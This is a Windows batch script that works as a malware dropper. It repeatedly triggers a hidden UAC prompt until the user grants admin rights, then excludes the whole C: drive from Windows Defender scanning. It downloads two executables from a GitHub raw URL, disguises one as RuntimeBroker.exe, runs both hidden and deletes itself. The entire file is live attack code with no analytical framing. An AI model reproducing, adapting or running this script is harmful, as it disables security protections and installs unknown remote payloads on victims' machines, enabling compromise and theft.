@echo off
:: Check if the script is running with administrator privileges
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    rem Script is already running with admin rights
    rem Hide all output by redirecting to nul
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1

    rem Download RuntimeBroker.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Download os6a5v5a.exe and assign a random name
    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1

    rem Ensure both files are fully downloaded before running
    :wait_runtime
    if not exist "%TEMP%\RuntimeBroker.exe" (
        timeout /t 1 >nul
        goto wait_runtime
    )

    :wait_os6a5v5a
    if not exist "%RANDOM_NAME%" (
        timeout /t 1 >nul
        goto wait_os6a5v5a
    )

    rem Run RuntimeBroker.exe
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"

    rem Run the random file os6a5v5a.exe
    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'"

    rem Delete the batch script itself after execution
    del "%~f0" >nul 2>&1

    exit
)

:loop
    rem Trigger the UAC prompt using PowerShell from within the batch file
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1

    rem If user declines the UAC prompt, retry
    if %errorlevel% NEQ 0 (
        timeout /t 3 >nul
        goto loop
    )

    rem If UAC is accepted, proceed with the next task
    rem Hide all output by redirecting to nul
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1

    rem Download RuntimeBroker.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Download os6a5v5a.exe and assign a random name
    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1

    rem Ensure both files are fully downloaded before running
    :wait_runtime
    if not exist "%TEMP%\RuntimeBroker.exe" (
        timeout /t 1 >nul
        goto wait_runtime
    )

    :wait_os6a5v5a
    if not exist "%RANDOM_NAME%" (
        timeout /t 1 >nul
        goto wait_os6a5v5a
    )

    rem Run RuntimeBroker.exe
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"

    rem Run the random file os6a5v5a.exe
    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'"

    rem Delete the batch script itself after execution
    del "%~f0" >nul 2>&1

    exit
